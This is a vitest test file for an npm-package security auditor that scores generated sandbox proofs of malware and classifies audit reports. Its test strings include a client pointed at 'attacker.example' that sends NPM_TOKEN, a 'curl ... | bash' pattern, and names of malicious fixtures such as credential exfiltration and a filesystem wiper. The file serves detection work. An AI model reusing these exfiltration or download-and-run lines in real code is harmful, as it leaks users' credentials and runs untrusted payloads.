import { readFileSync } from "node:fs";
import { resolve } from "node:path";
import { describe, expect, it } from "vitest";
import type { AuditReport, Proof } from "./models.js";
import {
  assessGeneratedTestProofQuality,
  classifyAuditReport,
} from "./proof-quality.js";

function proof(overrides: Partial<Proof> = {}): Proof {
  return {
    capability: "CREDENTIAL_THEFT",
    attackPathway: "",
    confidence: "CONFIRMED",
    fileLine: "index.js:1",
    problem: "reads and exfiltrates a canary",
    evidence: "generated test",
    kind: "TEST_CONFIRMED",
    contentHash: null,
    reproducible: true,
    reproductionCmd: null,
    testFile: "/tmp/finding.test.ts",
    testHash: "abc",
    testCode: null,
    verifyError: null,
    reasoningHash: null,
    teeAttestationId: null,
    ...overrides,
  };
}

function report(overrides: Partial<AuditReport> = {}): AuditReport {
  return {
    verdict: "DANGEROUS",
    capabilities: [],
    proofs: [],
    triage: null,
    findings: [],
    trace: [],
    runtimeEvidence: null,
    ...overrides,
  };
}

describe("assessGeneratedTestProofQuality", () => {
  it("accepts an unconditional canary crossing a captured network sink", () => {
    const result = assessGeneratedTestProofQuality(`
      const { runPackage } = require("../harness/sandbox-runner");
      it("exfiltrates planted credentials", async () => {
        let exfilBody = "";
        server.use(http.post("*", async ({ request }) => {
          exfilBody = await request.text();
          return HttpResponse.text("ok");
        }));
        await runPackage("package", "postinstall.js");
        expect(exfilBody).toContain("NPMGUARD_CANARY");
      });
    `, "CREDENTIAL_THEFT");

    expect(result.accepted).toBe(true);
    expect(result.signals).toContain("canary-crossed-sink");
  });

  it("rejects a negative test that passes because nothing happened", () => {
    const result = assessGeneratedTestProofQuality(`
      const { runPackage } = require("../harness/sandbox-runner");
      it("does not exfiltrate credentials", async () => {
        let exfilBody = null;
        await runPackage("package", "index.js");
        expect(exfilBody).toBeNull();
      });
    `, "CREDENTIAL_THEFT");

    expect(result.accepted).toBe(false);
    expect(result.reason).toContain("absence");
  });

  it("rejects a self-satisfying environment assertion", () => {
    const result = assessGeneratedTestProofQuality(`
      const { runPackage } = require("../harness/sandbox-runner");
      it("exfiltrates credentials", async () => {
        await runPackage("package", "index.js");
        const envRead = Object.keys(process.env).filter((k) => k.includes("NPM_TOKEN"));
        expect(envRead.length > 0).toBe(true);
      });
    `, "DOM_INJECT");

    expect(result.accepted).toBe(false);
    expect(result.reason).toContain("environment itself");
  });

  it("rejects attacker-controlled configuration supplied by the test", () => {
    const result = assessGeneratedTestProofQuality(`
      const { runPackage } = require("../harness/sandbox-runner");
      it("sends a request", async () => {
        const { Client } = await runPackage("package", "index.js");
        const client = new Client({ apiBaseUrl: "https://attacker.example/" });
        await client.send(process.env.NPM_TOKEN);
        expect(body).toContain("NPMGUARD_CANARY");
      });
    `, "CREDENTIAL_THEFT");

    expect(result.accepted).toBe(false);
    expect(result.reason).toContain("attacker-controlled input");
  });

  it("rejects a normal process API call without a dangerous outcome", () => {
    const result = assessGeneratedTestProofQuality(`
      const cp = require("child_process");
      const { runPackage } = require("../harness/sandbox-runner");
      it("starts its documented watchdog", async () => {
        const spy = vi.spyOn(cp, "spawn");
        await runPackage("package", "watchdog.js");
        expect(spy).toHaveBeenCalled();
      });
    `, "PROCESS_SPAWN");

    expect(result.accepted).toBe(false);
  });

  it("accepts a lifecycle payload that produces a shell download-and-execute chain", () => {
    const result = assessGeneratedTestProofQuality(`
      const fs = require("fs");
      const { runPackage } = require("../harness/sandbox-runner");
      it("downloads and executes a payload during install", async () => {
        await runPackage("package", "postinstall.js");
        const spawnLog = fs.readFileSync("/workspace/spawn-log.txt", "utf8");
        expect(spawnLog).toMatch(/curl .* | bash/);
      });
    `, "LIFECYCLE_HOOK");

    expect(result.accepted).toBe(true);
    expect(result.signals).toContain("dangerous-process-chain");
  });

  it("accepts a reproducible DoS only when timeout and impact are both asserted", () => {
    const result = assessGeneratedTestProofQuality(`
      const { runInChildProcess } = require("../harness/child-process-runner");
      it("loops and floods stdout", async () => {
        const result = await runInChildProcess("package", "index.js", { timeout: 1000 });
        expect(result.timedOut).toBe(true);
        expect(result.stdout.length).toBeGreaterThan(1024);
      });
    `, "DOS_LOOP");

    expect(result.accepted).toBe(true);
  });

  it("accepts every malicious harness reference used by test generation", () => {
    const references: Record<string, string> = {
      "build-plugin-exfil": "BUILD_PLUGIN_EXFIL",
      "clipboard-hijack": "CLIPBOARD_HIJACK",
      "dns-exfil": "DNS_EXFIL",
      "dom-inject": "DOM_INJECT",
      "dos-loop": "DOS_LOOP",
      "encrypted-payload": "ENCRYPTED_PAYLOAD",
      "env-exfil": "CREDENTIAL_THEFT",
      "filesystem-wiper": "FILESYSTEM",
      "lifecycle-hook": "LIFECYCLE_HOOK",
      "obfuscated-dropper": "OBFUSCATION",
      "telemetry-rat": "TELEMETRY_RAT",
    };

    for (const [fixture, capability] of Object.entries(references)) {
      const code = readFileSync(
        resolve(import.meta.dirname, `../../sandbox/exploits/${fixture}.test.js`),
        "utf8",
      );
      const assessment = assessGeneratedTestProofQuality(code, capability);
      expect(
        assessment.accepted,
        `${fixture}: ${assessment.reason}`,
      ).toBe(true);
    }
  });
});

describe("classifyAuditReport", () => {
  it("downgrades a legacy DANGEROUS report without reproducible proof to SUSPECT", () => {
    expect(classifyAuditReport(report({
      findings: [{
        capability: "NETWORK",
        confidence: "LIKELY",
        fileLine: "index.js:1",
        problem: "may send data",
        evidence: "static signal",
        reproductionStrategy: "",
      }],
    }))).toBe("SUSPECT");
  });

  it("downgrades a legacy passing negative test to SUSPECT", () => {
    expect(classifyAuditReport(report({
      proofs: [proof({
        testCode: `
          const { runPackage } = require("../harness/sandbox-runner");
          it("does not steal credentials", async () => {
            await runPackage("package", "index.js");
            expect(exfilBody).toBeNull();
          });
        `,
      })],
    }))).toBe("SUSPECT");
  });

  it("keeps a high-quality confirmed proof DANGEROUS", () => {
    expect(classifyAuditReport(report({
      proofs: [proof({
        testCode: `
          const { runPackage } = require("../harness/sandbox-runner");
          it("exfiltrates credentials", async () => {
            await runPackage("package", "postinstall.js");
            expect(exfilBody).toContain("NPMGUARD_CANARY");
          });
        `,
      })],
    }))).toBe("DANGEROUS");
  });

  it("keeps deterministic inventory dealbreakers DANGEROUS", () => {
    expect(classifyAuditReport(report({
      proofs: [proof({
        capability: null,
        kind: "STRUCTURAL",
        evidence: "Dealbreaker: shell-pipe",
        testCode: null,
        testFile: null,
      })],
    }))).toBe("DANGEROUS");
  });

  it("downgrades legacy missing-install-script dealbreakers to SUSPECT", () => {
    expect(classifyAuditReport(report({
      proofs: [proof({
        capability: null,
        kind: "STRUCTURAL",
        evidence: "Dealbreaker: missing-install-script",
        problem: "Install script references 'install/check' but file not found in package",
        testCode: null,
        testFile: null,
      })],
    }))).toBe("SUSPECT");
  });
});
